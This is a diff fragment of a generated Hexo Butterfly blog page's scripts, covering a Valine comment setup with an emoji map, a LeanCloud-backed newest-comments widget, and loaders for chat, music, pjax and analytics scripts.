+          "Heybox6": "Heybox/expression_cube_doge.png",
+          "Heybox7": "Heybox/expression_cube_gandong.png",
+          "Heybox8": "Heybox/expression_cube_guai.png",
+          "Heybox9": "Heybox/expression_cube_gugu.png",
+          "Heybox10": "Heybox/expression_cube_han.png",
+          "Heybox13": "Heybox/expression_cube_huaji.png",
+          "Heybox19": "Heybox/expression_cube_kuqi.png",
+          "Heybox20": "Heybox/expression_cube_nu.png",
+          "Heybox21": "Heybox/expression_cube_penshui.png",
+          "Heybox22": "Heybox/expression_cube_qiliang.png",
+          "Heybox23": "Heybox/expression_cube_shengqi.png",
+          "Heybox28": "Heybox/expression_cube_wa.png",
+          "Heybox29": "Heybox/expression_cube_weiqu.png",
+          "Heybox38": "Heybox/expression_heyboxgirl.png",
+          "Heybox41": "Heybox/expression_heygirl_aidao.png",
+          "Heybox42": "Heybox/expression_heygirl_baipiaoguai.png",
+          "Heybox43": "Heybox/expression_heygirl_chi.png",
+          "Heybox44": "Heybox/expression_heygirl_chigua.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox47": "Heybox/expression_heygirl_haixiu.png",
+          "Heybox48": "Heybox/expression_heygirl_henaicha.png",
+          "Heybox49": "Heybox/expression_heygirl_huaji.png",
+          "Heybox50": "Heybox/expression_heygirl_jing.png",
+          "Heybox51": "Heybox/expression_heygirl_jixialai.png",
+          "Heybox52": "Heybox/expression_heygirl_kaikele.png",
+          "Heybox53": "Heybox/expression_heygirl_ku.png",
+          "Heybox54": "Heybox/expression_heygirl_kujiuruhou.png",
+          "Heybox55": "Heybox/expression_heygirl_nielian.png",
+          "Heybox56": "Heybox/expression_heygirl_qiaokaixin.png",
+          "Heybox58": "Heybox/expression_heygirl_rua.png",
+          "Heybox59": "Heybox/expression_heygirl_toukan.png",
+          "Heybox60": "Heybox/expression_heygirl_tu.png",
+          "Heybox61": "Heybox/expression_heygirl_wuyu.png",
+          "Heybox62": "Heybox/expression_heygirl_xihuan.png",
+          "Heybox63": "Heybox/expression_heygirl_yiwen.png",
+          "Heybox64": "Heybox/expression_heygirl_zhe.png",
+          "Heybox65": "Heybox/expression_heziji_1.png",
+          "Heybox66": "Heybox/expression_heziji_10.png",
+          "Heybox67": "Heybox/expression_heziji_11.png",
+          "Heybox68": "Heybox/expression_heziji_12.png",
+          "Heybox70": "Heybox/expression_heziji_14.png",
+          "Heybox71": "Heybox/expression_heziji_15.png",
+          "Heybox77": "Heybox/expression_heziji_20.png",
+          "Heybox78": "Heybox/expression_heziji_21.png",
+          "Heybox79": "Heybox/expression_heziji_22.png",
+          "Heybox80": "Heybox/expression_heziji_23.png",
+          "Heybox87": "Heybox/expression_heziji_3.png",
+          "Heybox88": "Heybox/expression_heziji_30.png",
+          "Heybox89": "Heybox/expression_heziji_31.png",
+          "HONKAI3-Daily1": "HONKAI3-Daily/1.gif",
+          "HONKAI3-Daily2": "HONKAI3-Daily/10.gif",
+          "HONKAI3-Daily3": "HONKAI3-Daily/11.gif",
+          "HONKAI3-Daily4": "HONKAI3-Daily/12.gif",
+          "HONKAI3-Daily5": "HONKAI3-Daily/13.gif",
+          "HONKAI3-Daily6": "HONKAI3-Daily/14.gif",
+          "HONKAI3-Daily7": "HONKAI3-Daily/15.gif",
+          "HONKAI3-Daily8": "HONKAI3-Daily/16.gif",
+          "HONKAI3-Daily9": "HONKAI3-Daily/2.gif",
+          "HONKAI3-Daily10": "HONKAI3-Daily/3.gif",
+          "HONKAI3-Daily11": "HONKAI3-Daily/4.gif",
+          "HONKAI3-Daily12": "HONKAI3-Daily/5.gif",
+          "HONKAI3-Daily13": "HONKAI3-Daily/6.gif",
+          "HONKAI3-Daily14": "HONKAI3-Daily/7.gif",
+          "HONKAI3-Daily15": "HONKAI3-Daily/8.gif",
+          "HONKAI3-Daily16": "HONKAI3-Daily/9.gif",
+          "HONKAI3-Star1": "HONKAI3-Star/1.gif",
+          "HONKAI3-Star2": "HONKAI3-Star/10.gif",
+          "HONKAI3-Star3": "HONKAI3-Star/11.gif",
+          "HONKAI3-Star4": "HONKAI3-Star/12.gif",
+          "HONKAI3-Star5": "HONKAI3-Star/13.gif",
+          "HONKAI3-Star6": "HONKAI3-Star/14.gif",
+          "HONKAI3-Star7": "HONKAI3-Star/15.gif",
+          "HONKAI3-Star8": "HONKAI3-Star/16.gif",
+          "HONKAI3-Star9": "HONKAI3-Star/2.gif",
+          "HONKAI3-Star10": "HONKAI3-Star/3.gif",
+          "HONKAI3-Star11": "HONKAI3-Star/4.gif",
+          "HONKAI3-Star12": "HONKAI3-Star/5.gif",
+          "HONKAI3-Star13": "HONKAI3-Star/6.gif",
+          "HONKAI3-Star14": "HONKAI3-Star/7.gif",
+          "HONKAI3-Star15": "HONKAI3-Star/8.gif",
+          "HONKAI3-Star16": "HONKAI3-Star/9.gif"
+      },
+      path: window.location.pathname,
+      placeholder: '',
+      pageSize: '',
+      lang: 'zh-CN',
+      recordIP: true,
+      emojiCDN: 'https://valinecdn.bili33.top/',
+      enableQQ: true,
+      tagMeta: ["UP","Buddy","Visitor"],
+      master: '1e45134c2d9e333e8889556513f09903',
+      friends: ['5029a42d22ca4d65e16cf3fdd9654ffe'],
+      requiredFields: ['nick','mail'],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://MynqQPDI.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+        "X-LC-Key": 'nQR603PJj8t2qUQiGTSeqXrB',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1641175681147" id="myhk" key="1641175681147" m="1"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
+    w.ChatraID = 'EqStaz8vFN6KYhHzY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
